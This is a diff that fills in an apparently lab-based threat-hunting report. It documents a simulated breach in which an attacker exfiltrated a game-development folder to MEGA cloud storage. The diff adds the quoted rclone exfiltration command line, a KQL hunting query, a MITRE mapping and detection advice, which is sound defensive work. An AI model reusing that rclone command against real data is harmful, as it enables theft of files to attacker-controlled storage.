@@ -120,7 +120,7 @@ A security breach was identified within EmberForge Studios, prompting a focused 
 |-----:|-------------------|----------|----------|
 | 0 | MITRE ATT&CK: N/A (Analyst validation step – not adversary activity)| TA0007 – Discovery | Data/Environment Discovery” (analyst-side equivalent, not attacker action) |
 | 1 | MITRE ATT&CK: T1560 – Archive Collected Data | T1560 Archive Collected Data. | <Placeholder> |
-| 2 | <Placeholder> | <Placeholder> | <Placeholder> |
+| 2 | MITRE ATT&CK: T1567.002 – Exfiltration to Cloud Storage | T1567 – Exfiltration Over Web Service. | <Placeholder> |
 | 3 | <Placeholder> | <Placeholder> | <Placeholder> |
 | 4 | <Placeholder> | <Placeholder> | <Placeholder> |
 | 5 | <Placeholder> | <Placeholder> | <Placeholder> |
@@ -259,34 +259,41 @@ ___
 <summary id="-flag-2">🚩 <strong>Flag 2: <Technique Name></strong></summary>
 
 ### 🎯 Objective
-<What the attacker was trying to accomplish>
+Exfiltrate collected data from the compromised environment to an external cloud storage provider.
 
 ### 📌 Finding
-<High-level description of the activity>
+The attacker used the tool `rclone.exe` to transfer data from the local directory `C:\GameDev` to a remote cloud storage service, indicating successful data exfiltration activity.
+
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
-| Timestamp | <Placeholder> |
-| Process | <Placeholder> |
-| Parent Process | <Placeholder> |
-| Command Line | <Placeholder> |
+| Host | EC2AMAZ-16V3AU4.emberforge.local |
+| Timestamp | 2026-01-30 23:07:45.695 UTC |
+| Process | rclone.exe |
+| Parent Process | Unknown (likely cmd.exe or script execution) |
+| Command Line | C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil -v |
 
 ### 💡 Why it matters
-<Explain impact, risk, and relevance>
+This confirms that sensitive data from `C:\GameDev` was not only staged but successfully exfiltrated to an external cloud provider, **MEGA**. The use of `rclone` with embedded configuration and destination (`mega:exfil`) indicates the attacker had pre-configured authentication, enabling stealthy and efficient data transfer. This represents a high-impact breach involving potential loss of intellectual property and highlights the risk of cloud-based exfiltration channels bypassing traditional network defenses.
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
+| where CommandLine_s has_any ("rclone", "Compress-Archive", "mega:exfil")
+| project UtcTime_s, Computer, CommandLine_s
+| order by todatetime(UtcTime_s) asc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="2064" height="238" alt="image" src="https://github.com/user-attachments/assets/f984ebb2-3173-496b-a3f2-6bc993a40664" />
+
 
 ### 🛠️ Detection Recommendation
+Monitor and alert on the use of data transfer utilities such as `rclone.exe`, especially when executed from non-standard directories (e.g., `C:\Users\Public`). Implement command-line logging and detection rules for keywords like cloud destinations (e.g., `mega:`, `drive:`, `s3:`) and configuration file usage. Correlate process execution with outbound network activity to cloud storage providers.
 
 **Hunting Tip:**  
-<Actionable guidance for defenders>
+Search for command-line patterns that include both a local source path and a remote destination (e.g., `copy C:\... <provider>:`). Focus on tools capable of exfiltration (rclone, curl, powershell) and investigate any activity involving public directories or embedded config files, as these are common attacker staging techniques.
 
 </details>
 
